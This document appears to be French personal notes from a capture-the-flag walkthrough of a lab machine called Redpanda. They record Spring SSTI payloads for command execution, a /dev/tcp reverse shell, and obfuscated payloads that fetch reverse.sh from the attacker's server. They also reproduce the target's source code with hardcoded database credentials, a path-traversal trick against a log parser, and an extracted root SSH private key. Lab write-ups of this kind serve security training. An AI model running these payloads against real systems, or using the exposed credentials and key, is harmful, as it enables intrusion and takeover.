# Redpanda - Easy

nmap -sV ip → découverte d’un proxy http sur le port 8080

ouverture du site sur firefox, test des champs sans succès donc dirb et nikto

pas de vuln au post apparemment mais découverte de la page stats qui peut être vulnérable

SSTI → `<%= system('cat /etc/passwd') %>` (plusieurs templates à tester)

`<%= system('') %>`

(en fait c’est du spring

{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

il faut trouver le bon template

{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('sh -i >& /dev/tcp/10.10.16.41/9090 0>&1').getInputStream())}

On utilise cette commande pour essayer de trouver des fichiers sensibles vu que les reverse shell n’ont pas fonctionné jusqu’ici. → on peut capturer le flag user de cette manière

Convertir la commande comme dans payload all the things pour RCE ? 

[https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload)

création d’un payload qui va curl un fichier depuis notre serveur attaquant qui va créer un reverse shell (reverse shell direct ne fonctionne pas)

```jsx
python3 -m http.server
```

curl 10.10.16.40:8000/reverse.sh —output /tmp/reverse.sh

```jsx
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```

ls /tmp/

```jsx
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112))).getInputStream())}
```

bash /tmp/reverse.sh

```jsx
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```

il y a des fichiers xml étrange dans le home de woodenk (l’user qu’on utilise)

Scan linpeas:

[Linpeas scan](https://www.notion.so/Linpeas-scan-795f160f7fe045159d08056cb46b4936)

Le controller java

```java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
  	public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
		SAXBuilder saxBuilder = new SAXBuilder();
		if(author == null)
		author = "N/A";
		author = author.strip();
		System.out.println('"' + author + '"');
		if(author.equals("woodenk") || author.equals("damian"))
		{
			String path = "/credits/" + author + "_creds.xml";
			File fd = new File(path);
			Document doc = saxBuilder.build(fd);
			Element rootElement = doc.getRootElement();
			String totalviews = rootElement.getChildText("totalviews");
		       	List<Element> images = rootElement.getChildren("image");
			for(Element image: images)
				System.out.println(image.getChildText("uri"));
			model.addAttribute("noAuthor", false);
			model.addAttribute("author", author);
			model.addAttribute("totalviews", totalviews);
			model.addAttribute("images", images);
			return new ModelAndView("stats.html");
		}
		else
		{
			model.addAttribute("noAuthor", true);
			return new ModelAndView("stats.html");
		}
	}
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
  @PostMapping("/search")
	public ModelAndView search(@RequestParam("name") String name, Model model) {
	if(name.isEmpty())
	{
		name = "Greg";
	}
        String query = filter(name);
	ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
	model.addAttribute("pandas", pandas);
	model.addAttribute("n", pandas.size());
	return new ModelAndView("search.html");
	}
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
		panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>3</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>2</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>2</views>
  </image>
  <totalviews>8</totalviews>
</credits>
```

autre code (logparser):

```java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
		// Interprète le XML
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
           
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
						// If it's not an image on the log file
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
						// Change uri into artist name
            String artist = getArtist(parsed_data.get("uri").toString());
						// Add a view for the artist
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

artist = ../tmp/fake

222||a||a||`/../../../../../../tmp/`fake.jpg

```java
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```